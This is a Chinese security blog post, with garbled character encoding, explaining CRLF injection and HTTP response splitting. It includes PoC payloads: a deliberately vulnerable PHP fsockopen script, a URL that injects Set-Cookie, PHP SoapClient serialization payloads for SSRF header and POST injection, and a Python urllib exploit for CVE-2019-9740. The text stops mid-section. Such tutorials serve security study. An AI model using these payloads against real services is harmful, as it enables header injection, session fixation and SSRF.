<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><title>CRLFæ³¨å…¥æµ…æ | æœˆè½èŠ±å¼€</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=1.0.0"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/normalize.css/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/pure-min.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/clipboard/dist/clipboard.min.js"></script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.js"></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.css"><meta name="generator" content="Hexo 5.4.0"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">CRLFæ³¨å…¥æµ…æ</h1><a id="logo" href="/.">æœˆè½èŠ±å¼€</a><p class="description"></p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> Home</i></a><a href="/archives/"><i class="fa fa-archive"> Archive</i></a><a href="/about/"><i class="fa fa-user"> About</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a><a href="/ppt/"><i class="fa fa-archive"> ppt</i></a><a href="/sdl/"><i class="fa fa-rss"> sdl</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">CRLFæ³¨å…¥æµ…æ</h1><div class="post-meta">2021-05-25<span class="post-time"><span class="post-meta-item-text"> | </span><span class="post-meta-item-icon"><i class="fa fa-keyboard-o"></i><span class="post-count"> 5.1k</span><span class="post-meta-item-text"> Words</span></span></span><span class="post-time"> | <span class="post-meta-item-icon"><i class="fa fa-clock-o"></i><span class="post-count"> 23</span><span class="post-meta-item-text"> Minutes</span></span></span></div><div class="post-content"><h3 id="ä¸€ã€æ¼æ´æè¿°"><a href="#ä¸€ã€æ¼æ´æè¿°" class="headerlink" title="ä¸€ã€æ¼æ´æè¿°"></a>ä¸€ã€æ¼æ´æè¿°</h3><ul>
<li>HTTPæŠ¥æ–‡çš„ç»“æ„ï¼šçŠ¶æ€è¡Œå’Œé¦–éƒ¨ä¸­çš„æ¯è¡Œä»¥CRLFç»“æŸï¼Œé¦–éƒ¨ä¸ä¸»ä½“ä¹‹é—´ç”±ä¸€ç©ºè¡Œåˆ†éš”ã€‚æˆ–è€…ç†è§£ä¸ºé¦–éƒ¨æœ€åä¸€ä¸ªå­—æ®µæœ‰ä¸¤ä¸ªCRLFï¼Œé¦–éƒ¨å’Œä¸»ä½“ç”±ä¸¤ä¸ªCRLFåˆ†éš”ã€‚<br>CRLFæ³¨å…¥æ¼æ´ï¼Œæ˜¯å› ä¸ºWebåº”ç”¨æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥åšä¸¥æ ¼éªŒè¯ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥è¾“å…¥ä¸€äº›æ¶æ„å­—ç¬¦ã€‚æ”»å‡»è€…ä¸€æ—¦å‘è¯·æ±‚è¡Œæˆ–é¦–éƒ¨ä¸­çš„å­—æ®µæ³¨å…¥æ¶æ„çš„CRLFï¼Œå°±èƒ½æ³¨å…¥ä¸€äº›é¦–éƒ¨å­—æ®µæˆ–æŠ¥æ–‡ä¸»ä½“ï¼Œå¹¶åœ¨å“åº”ä¸­è¾“å‡ºï¼Œæ‰€ä»¥åˆç§°ä¸ºHTTPå“åº”æ‹†åˆ†æ¼æ´ï¼ˆHTTP Response Splittingï¼‰ã€‚</li>
</ul>
<h3 id="äºŒã€HTTPæŠ¥æ–‡åŸºç¡€çŸ¥è¯†"><a href="#äºŒã€HTTPæŠ¥æ–‡åŸºç¡€çŸ¥è¯†" class="headerlink" title="äºŒã€HTTPæŠ¥æ–‡åŸºç¡€çŸ¥è¯†"></a>äºŒã€HTTPæŠ¥æ–‡åŸºç¡€çŸ¥è¯†</h3><ol>
<li><p>CRLF : æŒ‡çš„æ˜¯ <font color=#FF0000>å›è½¦ç¬¦</font>(CRï¼ŒASCII 13ï¼Œ\rï¼Œ%0d) å’Œ <font color=#FF0000>æ¢è¡Œç¬¦</font>(LFï¼ŒASCII 10ï¼Œ\nï¼Œ%0a)ã€‚</p>
</li>
<li><p>CRLF : æºè‡ªæ‰“å­—æœºï¼Œè¡¨æ˜è¡Œçš„ç»“æŸï¼Œè®¡ç®—æœºå‡ºç°åæ²¿ç”¨äº†è¿™ä¸ªæ¦‚å¿µã€‚</p>
</li>
<li><p>å›è½¦ç¬¦ï¼šå…‰æ ‡ç§»åˆ°è¡Œé¦–ï¼Œ</p>
</li>
<li><p>æ¢è¡Œç¬¦ï¼šå…‰æ ‡å‚ç›´ç§»åˆ°ä¸‹è¡Œã€‚</p>
</li>
</ol>
<ul>
<li>é”®ç›˜ä¸Šçš„å›è½¦é”®(Enter)å°±å¯ä»¥æ‰§è¡Œè¯¥æ“ä½œã€‚ä½†æ˜¯ä¸åŒçš„æ“ä½œç³»ç»Ÿï¼Œè¡Œçš„ç»“æŸç¬¦æ˜¯ä¸ä¸€æ ·çš„ã€‚    </li>
</ul>
<ol start="5">
<li><p>Windowsï¼šä½¿ç”¨CRLFè¡¨ç¤ºè¡Œçš„ç»“æŸ</p>
</li>
<li><p>Linux/Unixï¼šä½¿ç”¨LFè¡¨ç¤ºè¡Œçš„ç»“æŸ</p>
</li>
<li><p>MacOSï¼šæ—©æœŸä½¿ç”¨CRè¡¨ç¤ºï¼Œç°åœ¨å¥½åƒä¹Ÿç”¨LFè¡¨ç¤ºè¡Œçš„ç»“æŸ.</p>
</li>
</ol>
<ul>
<li>åœ¨HTTPè§„èŒƒä¸­ï¼Œè¡Œåº”è¯¥ä½¿ç”¨CRLFæ¥ç»“æŸã€‚é¦–éƒ¨ä¸ä¸»ä½“ç”±ä¸¤ä¸ªCRLFåˆ†éš”ï¼Œæµè§ˆå™¨æ ¹æ®è¿™ä¸¤ä¸ªCRLFæ¥è·å–HTTPå†…å®¹å¹¶æ˜¾ç¤ºã€‚</li>
</ul>
<h3 id="ä¸‰ã€æ¼æ´åŸç†"><a href="#ä¸‰ã€æ¼æ´åŸç†" class="headerlink" title="ä¸‰ã€æ¼æ´åŸç†"></a>ä¸‰ã€æ¼æ´åŸç†</h3><ul>
<li><p>HTTPå“åº”æŠ¥æ–‡çš„ç»“æ„æ˜¯ï¼šçŠ¶æ€è¡Œã€å“åº”å¤´éƒ¨å’Œå“åº”åŒ…ä½“ã€‚åœ¨HTTPè§„èŒƒä¸­ï¼Œæ¢è¡Œä½¿ç”¨CRLFæ¥è¡¨ç¤ºã€‚å…¶ä¸­å“åº”å¤´éƒ¨ä¸­å“åº”å¤´ä¸å“åº”å¤´ä¹‹é—´ç”¨ä¸€ä¸ªCRLFåˆ†éš”ï¼Œå“åº”å¤´éƒ¨ä¸­æœ€åä¸€ä¸ªå“åº”å¤´å’Œå“åº”åŒ…ä½“ä¹‹é—´ç”¨ä¸¤ä¸ªCRLFåˆ†éš”ã€‚</p>
</li>
<li><p>æ ¹æ®è¿™ä¸ªåˆ†å‰²è§„å¾‹ï¼ˆç”¨ä¸€ä¸ªCRLFåˆ†éš”çš„å°±æ˜¯ä¸åŒçš„å“åº”å¤´ï¼Œç”¨ä¸¤ä¸ªCRLFåˆ†éš”çš„å°±æ˜¯æœ€åä¸€ä¸ªå“åº”å¤´å’Œå“åº”åŒ…ä½“ï¼‰ï¼Œå¦‚æœä¸€ä¸ªå“åº”å¤´çš„valueä¸­æœ‰ä¸€ä¸ªCRLFï¼Œé‚£ä¹ˆè¿™ä¸ªå“åº”å¤´çš„CRLFä¹‹å‰çš„å†…å®¹ä½œä¸ºæœ¬å“åº”å¤´çš„valueï¼Œè€ŒCRLFä¹‹åçš„å†…å®¹åˆ™ä¼šè¢«ä½œä¸ºå¦ä¸€ä¸ªå“åº”å¤´ï¼ˆæˆ–å“åº”åŒ…ä½“ï¼‰å¤„ç†ã€‚å¦‚æœç”¨æˆ·çš„è¾“å…¥ä¼šè®¾ç½®åˆ°æŸå“åº”å¤´ä¸­çš„valueï¼Œé‚£ä¹ˆé€šè¿‡æ·»åŠ CRLFå°±å¯ä»¥è¿›è¡ŒCRLFæ³¨å…¥æ”»å‡»ã€‚</p>
<p>  <img src="/images/pasted-33.png" alt="upload successful"></p>
</li>
</ul>
<h3 id="å››ã€å®¹æ˜“å½¢æˆæ¼æ´çš„ç‚¹"><a href="#å››ã€å®¹æ˜“å½¢æˆæ¼æ´çš„ç‚¹" class="headerlink" title="å››ã€å®¹æ˜“å½¢æˆæ¼æ´çš„ç‚¹"></a>å››ã€å®¹æ˜“å½¢æˆæ¼æ´çš„ç‚¹</h3><ol>
<li><p><strong><font color=#ff4500>PHP fsockopen() å‡½æ•°</font></strong></p>
<ul>
<li><p>fsockopen($hostname,$port,$errno,$errstr,$timeout)â€“ ç”¨äºæ‰“å¼€ä¸€ä¸ªç½‘ç»œè¿æ¥æˆ–è€…ä¸€ä¸ªUnix å¥—æ¥å­—è¿æ¥ï¼Œåˆå§‹åŒ–ä¸€ä¸ªå¥—æ¥å­—è¿æ¥åˆ°æŒ‡å®šä¸»æœºï¼ˆhostnameï¼‰ï¼Œå®ç°å¯¹ç”¨æˆ·æŒ‡å®šurlæ•°æ®çš„è·å–ã€‚è¯¥å‡½æ•°ä¼šä½¿ç”¨socketè·ŸæœåŠ¡å™¨å»ºç«‹tcpè¿æ¥ï¼Œè¿›è¡Œä¼ è¾“åŸå§‹æ•°æ®ã€‚<br>fsockopen()å°†è¿”å›ä¸€ä¸ªæ–‡ä»¶å¥æŸ„ï¼Œä¹‹åå¯ä»¥è¢«å…¶ä»–æ–‡ä»¶ç±»å‡½æ•°è°ƒç”¨ï¼ˆä¾‹å¦‚ï¼šfgets()ï¼Œfgetss()ï¼Œfwrite()ï¼Œfclose()è¿˜æœ‰feof()ï¼‰ã€‚å¦‚æœè°ƒç”¨å¤±è´¥ï¼Œå°†è¿”å›falseã€‚</p>
</li>
<li><p>æœåŠ¡ç«¯æµ‹è¯•ä»£ç </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">  &lt;?php</span><br><span class="line">     $host&#x3D;$_GET[&#39;url&#39;];</span><br><span class="line">     $fp &#x3D; fsockopen($host, 80, $errno, $errstr, 30);</span><br><span class="line">     if (!$fp) &#123;</span><br><span class="line">         echo &quot;$errstr ($errno)&lt;br &#x2F;&gt;\n&quot;;</span><br><span class="line">     &#125; else &#123;</span><br><span class="line">         $out &#x3D; &quot;GET &#x2F; HTTP&#x2F;1.1\r\n&quot;;</span><br><span class="line">         $out .&#x3D; &quot;Host: $host\r\n&quot;;</span><br><span class="line">         $out .&#x3D; &quot;Connection: Close\r\n\r\n&quot;;</span><br><span class="line">         fwrite($fp, $out);</span><br><span class="line">         while (!feof($fp)) &#123;</span><br><span class="line">             echo fgets($fp, 128);</span><br><span class="line">         &#125;</span><br><span class="line">         fclose($fp);</span><br><span class="line">     &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li>
<li><p>é¦–å…ˆæˆ‘ä»¬å°è¯•è®¿é—®æ­£å¸¸çš„urlï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?url&#x3D;192.168.249.3:4000</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°åœ¨å—å®³ä¸»æœºä¸Šå‘å‡ºçš„è¯·æ±‚å¦‚å›¾æ‰€ç¤ºï¼š<br><img src="/images/pasted-34.png" alt="upload successful"></p>
</li>
<li><p>æ¥ç€æˆ‘ä»¬è®¿é—®å¸¦æœ‰CRLFæ³¨å…¥çš„è¯·æ±‚ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?url&#x3D;192.168.249.3:4000%0d%0aSet-Cookie:%20PHPSESSID&#x3D;whoami</span><br></pre></td></tr></table></figure></li>
<li><p>å¯ä»¥çœ‹åˆ°åœ¨å—å®³ä¸»æœºä¸Šå‘å‡ºçš„è¯·æ±‚å¦‚å›¾æ‰€ç¤ºï¼šæ­¤æ—¶å‘é€çš„è¯·æ±‚äº§ç”Ÿäº†CRLFæ³¨å…¥ã€‚HTTPè§„èŒƒä¸­ï¼Œè¡Œä»¥CRLFç»“æŸã€‚æ‰€ä»¥å½“æ£€æµ‹åˆ°%0d%0aåï¼Œå°±è®¤ä¸º Host é¦–éƒ¨å­—æ®µè¿™è¡Œç»“æŸäº†ï¼ŒSet-Cookieå°±ä¼šè¢«è®¤ä¸ºæ˜¯ä¸‹ä¸€è¡Œï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š<br><img src="/images/pasted-35.png" alt="upload successful"></p>
</li>
</ul>
</li>
<li><p><strong><font color=#ff4500>PHP SoapClient ç±»</font></strong></p>
<ul>
<li><p>PHP çš„å†…ç½®ç±» SoapClient æ˜¯ä¸€ä¸ªä¸“é—¨ç”¨æ¥è®¿é—®webæœåŠ¡çš„ç±»ï¼Œå¯ä»¥æä¾›ä¸€ä¸ªåŸºäºSOAPåè®®è®¿é—®WebæœåŠ¡çš„ PHP å®¢æˆ·ç«¯ã€‚è¯¥å†…ç½®ç±»æœ‰ä¸€ä¸ª __call æ–¹æ³•ï¼Œå½“ __call æ–¹æ³•è¢«è§¦å‘åï¼Œå®ƒå¯ä»¥å‘é€ HTTP å’Œ HTTPS è¯·æ±‚ã€‚æ­£æ˜¯è¿™ä¸ª __call æ–¹æ³•ï¼Œä½¿å¾— SoapClient ç±»å¯ä»¥è¢«æˆ‘ä»¬è¿ç”¨åœ¨ SSRF ä¸­ã€‚</p>
</li>
<li><p>è¯¥ç±»çš„æ„é€ å‡½æ•°å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public SoapClient :: SoapClient(mixed $wsdl [ï¼Œarray $options ])</span><br></pre></td></tr></table></figure>
<ul>
<li>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç”¨æ¥æŒ‡æ˜æ˜¯å¦æ˜¯wsdlæ¨¡å¼ï¼Œå°†è¯¥å€¼è®¾ä¸ºnullåˆ™è¡¨ç¤ºéwsdlæ¨¡å¼ã€‚</li>
<li>ç¬¬äºŒä¸ªå‚æ•°ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå¦‚æœåœ¨wsdlæ¨¡å¼ä¸‹ï¼Œæ­¤å‚æ•°å¯é€‰ï¼›å¦‚æœåœ¨éwsdlæ¨¡å¼ä¸‹ï¼Œåˆ™å¿…é¡»è®¾ç½®locationå’Œurié€‰é¡¹ï¼Œå…¶ä¸­locationæ˜¯è¦å°†è¯·æ±‚å‘é€åˆ°çš„SOAPæœåŠ¡å™¨çš„URLï¼Œè€Œ uri æ˜¯SOAPæœåŠ¡çš„ç›®æ ‡å‘½åç©ºé—´ã€‚    </li>
</ul>
</li>
<li><p>çŸ¥é“ä¸Šè¿°ä¸¤ä¸ªå‚æ•°çš„å«ä¹‰åï¼Œæˆ‘ä»¬é¦–å…ˆæ¥å‘èµ·ä¸€ä¸ªæ­£å¸¸çš„HTTPè¯·æ±‚ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   $a &#x3D; new SoapClient(null,array(&#39;location&#39;&#x3D;&gt;&#39;http:&#x2F;&#x2F;47.101.57.11:4000&#x2F;aaa&#39;, &#39;uri&#39;&#x3D;&gt;&#39;http:&#x2F;&#x2F;47.101.57.11:4000&#39;));</span><br><span class="line">   $b &#x3D; serialize($a);</span><br><span class="line">   echo $b;</span><br><span class="line">   $c &#x3D; unserialize($b);</span><br><span class="line">   $c-&gt;a();    &#x2F;&#x2F; éšä¾¿è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•, è§¦å‘__callæ–¹æ³•è¿›è¡Œssrf</span><br><span class="line">  ?&gt;</span><br></pre></td></tr></table></figure>
<p>å‘é€ä¸€ä¸ªæ­£å¸¸çš„è¯·æ±‚<br><img src="/images/pasted-36.png" alt="upload successful"></p>
</li>
<li><p>åœ¨ User-Agent å¤´éƒ¨æ³¨å…¥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target &#x3D; &#39;http:&#x2F;&#x2F;47.101.57.72:4000&#x2F;&#39;;</span><br><span class="line">$a &#x3D; new SoapClient(null,array(&#39;location&#39; &#x3D;&gt; $target, &#39;user_agent&#39; &#x3D;&gt; &quot;WHOAMI\r\nSet-Cookie: PHPSESSID&#x3D;whoami&quot;, &#39;uri&#39; &#x3D;&gt; &#39;test&#39;));</span><br><span class="line">$b &#x3D; serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line">$c &#x3D; unserialize($b);</span><br><span class="line">$c-&gt;a();    &#x2F;&#x2F; éšä¾¿è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•, è§¦å‘__callæ–¹æ³•è¿›è¡Œssrf</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒVPS ä¸Šç›‘å¬åˆ°äº†è¯·æ±‚ï¼ŒæˆåŠŸåœ¨HTTPå¤´ä¸­æ’å…¥äº†ä¸€ä¸ªæˆ‘ä»¬è‡ªå®šä¹‰çš„ cookieï¼š<br><img src="/images/pasted-37.png" alt="upload successful"></p>
</li>
<li><p>æ³¨å…¥å‘é€ POST æ•°æ®åŒ…</p>
<ul>
<li>åœ¨HTTPåè®®ä¸­ï¼ŒHTTP Header éƒ¨åˆ†ä¸ HTTP Body éƒ¨åˆ†æ˜¯ç”¨ä¸¤ä¸ªCRLFåˆ†éš”çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å‘é€ POST æ•°æ®å°±è¦æ’å…¥ä¸¤ä¸ªCRLFã€‚<br>å¯¹äºå¦‚ä½•å‘é€POSTçš„æ•°æ®åŒ…ï¼Œè¿™é‡Œé¢è¿˜æœ‰ä¸€ä¸ªå‘ï¼Œå°±æ˜¯ Content-Type çš„è®¾ç½®ï¼Œå› ä¸ºæˆ‘ä»¬è¦æäº¤çš„æ˜¯POSTæ•°æ®ï¼Œæ‰€ä»¥ Content-Type çš„å€¼æˆ‘ä»¬è¦è®¾ç½®ä¸º application/x-www-form-urlencodedï¼Œè¿™é‡Œå¦‚ä½•ä¿®æ”¹ Content-Type çš„å€¼å‘¢ï¼Ÿç”±äº Content-Type åœ¨ User-Agent çš„ä¸‹é¢ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡ SoapClient æ¥è®¾ç½® User-Agent ï¼Œå°†åŸæ¥çš„ Content-Type æŒ¤ä¸‹å»ï¼Œä»è€Œå†æ’å…¥ä¸€ä¸ªæ–°çš„ Content-Type ã€‚</li>
</ul>
<p>æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target &#x3D; &#39;http:&#x2F;&#x2F;47.101.57.72:4000&#x2F;&#39;;</span><br><span class="line">$post_data &#x3D; &#39;data&#x3D;whoami&#39;;</span><br><span class="line">$headers &#x3D; array(</span><br><span class="line">    &#39;X-Forwarded-For: 127.0.0.1&#39;,</span><br><span class="line">    &#39;Cookie: PHPSESSID&#x3D;3stu05dr969ogmprk28drnju93&#39;</span><br><span class="line">);</span><br><span class="line">$a &#x3D; new SoapClient(null,array(&#39;location&#39; &#x3D;&gt; $target,&#39;user_agent&#39;&#x3D;&gt;&#39;WHOAMI^^Content-Type: application&#x2F;x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;. (string)strlen($post_data).&#39;^^^^&#39;.$post_data,&#39;uri&#39;&#x3D;&gt;&#39;test&#39;));</span><br><span class="line">$b &#x3D; serialize($a);</span><br><span class="line">$b &#x3D; str_replace(&#39;^^&#39;,&quot;\n\r&quot;,$b);</span><br><span class="line">echo $b;</span><br><span class="line">$c &#x3D; unserialize($b);</span><br><span class="line">$c-&gt;a();    &#x2F;&#x2F; éšä¾¿è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•, è§¦å‘__callæ–¹æ³•è¿›è¡Œssrf</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>VPS ä¸Šç›‘å¬åˆ°äº† POST æ•°æ®ï¼š<br><img src="/images/pasted-38.png" alt="upload successful"></p>
</li>
</ul>
</li>
<li><p><strong><font color=#ff4500>Python urllib CRLF æ³¨å…¥æ¼æ´ï¼ˆCVE-2019-9740ï¼‰</font></strong></p>
<ul>
<li><p>Pythonæ˜¯ä¸€å¥—å¼€æºçš„ã€é¢å‘å¯¹è±¡çš„ç¨‹åºè®¾è®¡è¯­è¨€ã€‚è¯¥è¯­è¨€å…·æœ‰å¯æ‰©å±•ã€æ”¯æŒæ¨¡å—å’ŒåŒ…ã€æ”¯æŒå¤šç§å¹³å°ç­‰ç‰¹ç‚¹ã€‚urllibæ˜¯å…¶ä¸­çš„ä¸€ä¸ªç”¨äºå¤„ç†URLçš„æ¨¡å—ã€‚urllib2æ˜¯å…¶ä¸­çš„ä¸€ä¸ªç”¨äºè·å–URLï¼ˆç»Ÿä¸€èµ„æºå®šä½ç¬¦ï¼‰çš„æ¨¡å—ã€‚<br>Python 2.xç‰ˆæœ¬è‡³2.7.16ç‰ˆæœ¬ä¸­çš„urllib2å’ŒPython 3.xç‰ˆæœ¬è‡³3.7.2ç‰ˆæœ¬ä¸­çš„urllibå­˜åœ¨æ³¨å…¥æ¼æ´ã€‚è¯¥æ¼æ´æºäºç”¨æˆ·è¾“å…¥æ„é€ å‘½ä»¤ã€æ•°æ®ç»“æ„æˆ–è®°å½•çš„æ“ä½œè¿‡ç¨‹ä¸­ï¼Œç½‘ç»œç³»ç»Ÿæˆ–äº§å“ç¼ºä¹å¯¹ç”¨æˆ·è¾“å…¥æ•°æ®çš„æ­£ç¡®éªŒè¯ï¼Œæœªè¿‡æ»¤æˆ–æœªæ­£ç¡®è¿‡æ»¤æ‰å…¶ä¸­çš„ç‰¹æ®Šå…ƒç´ ï¼Œå¯¼è‡´ç³»ç»Ÿæˆ–äº§å“äº§ç”Ÿè§£ææˆ–è§£é‡Šæ–¹å¼é”™è¯¯ã€‚ç®€å•æ¥è¯´ï¼Œå°±æ˜¯urlopen()å¤„ç†URLçš„æ—¶å€™æ²¡æœ‰è€ƒè™‘æ¢è¡Œç¬¦ï¼Œå¯¼è‡´æˆ‘ä»¬å¯ä»¥åœ¨æ­£å¸¸çš„HTTPå¤´ä¸­æ’å…¥ä»»æ„å†…å®¹ã€‚<br>è¯¥æ¼æ´æ—©åœ¨2016å¹´å°±è¢«çˆ†å‡ºï¼ˆCVE-2016-5699ï¼‰ï¼Œåœ¨ä¹‹åçš„ä¸€æ®µæ—¶é—´é‡Œä¸æ–­çˆ†å‡ºäº†pythonå…¶ä»–ç‰ˆæœ¬ä¹Ÿå­˜åœ¨è¯¥æ¼æ´ï¼ˆCVE-2019-9740ã€CVE-2019-9947ï¼‰ã€‚</p>
</li>
<li><p><strong>å½±å“èŒƒå›´ï¼š</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Python 2.xç‰ˆæœ¬è‡³2.7.16ç‰ˆæœ¬ä¸­çš„urllib2</span><br><span class="line">Python 3.xç‰ˆæœ¬è‡³3.7.2ç‰ˆæœ¬ä¸­çš„urllib</span><br></pre></td></tr></table></figure>
<p>åœ¨ HTTP çŠ¶æ€è¡Œæ³¨å…¥æ¶æ„é¦–éƒ¨å­—æ®µ<br>æµ‹è¯•ä»£ç ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!python</span><br><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3</span><br><span class="line">import urllib</span><br><span class="line">import urllib.request</span><br><span class="line">import urllib.error</span><br><span class="line"></span><br><span class="line">#url &#x3D; &quot;http:&#x2F;&#x2F;47.101.57.72:4000</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;47.101.57.72:4000?a&#x3D;1 HTTP&#x2F;1.1\r\nCRLF-injection: True\r\nSet-Cookie: PHPSESSID&#x3D;whoami&quot;</span><br><span class="line">#?a&#x3D;1 åé¢çš„é‚£ä¸ªHTTP&#x2F;1.1æ˜¯ä¸ºäº†é—­åˆæ­£å¸¸çš„HTTPçŠ¶æ€è¡Œ</span><br><span class="line">try:</span><br><span class="line">    info &#x3D; urllib.request.urlopen(url).info()</span><br><span class="line">    print(info)</span><br><span class="line"></span><br><span class="line">except urllib.error.URLError as e:</span><br><span class="line">    print(e)</span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œä»£ç åï¼ŒVPS ä¸Šä¼šç›‘å¬åˆ°å¦‚ä¸‹HTTPå¤´ï¼šæˆåŠŸè¿›è¡Œäº†CRLFæ³¨å…¥<br><img src="/images/pasted-39.png" alt="upload successful"><br>å¦‚æœæ˜¯ä½¿ç”¨ä¸å­˜åœ¨æ¼æ´çš„ç‰ˆæœ¬è¿›è¡Œè¯·æ±‚ï¼Œåˆ™ä¼šç›´æ¥è¿›è¡ŒæŠ¥é”™<br><img src="/images/pasted-40.png" alt="upload successful"></p>
</li>
<li><p><strong>åœ¨ HTTP çŠ¶æ€è¡Œæ³¨å…¥å®Œæ•´ HTTP è¯·æ±‚</strong><br>ç”±äº Python Urllib çš„è¿™ä¸ª CRLF æ³¨å…¥ç‚¹åœ¨ HTTP çŠ¶æ€è¡Œï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬è¦æ³¨å…¥å®Œæ•´çš„ HTTP è¯·æ±‚çš„è¯éœ€è¦å…ˆé—­åˆçŠ¶æ€è¡Œä¸­ HTTP/1.1 ï¼Œå³ä¿è¯æ³¨å…¥åæœ‰æ­£å¸¸çš„ HTTP çŠ¶æ€è¡Œã€‚å…¶æ¬¡ä¸ºäº†ä¸è®©åŸæ¥çš„ HTTP/1.1 å’Œ Host å­—æ®µå½±å“æˆ‘ä»¬æ–°æ„é€ çš„è¯·æ±‚ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å†æ„é€ ä¸€æ¬¡ GET / é—­åˆåŸæ¥çš„ HTTP è¯·æ±‚ã€‚</p>
<ul>
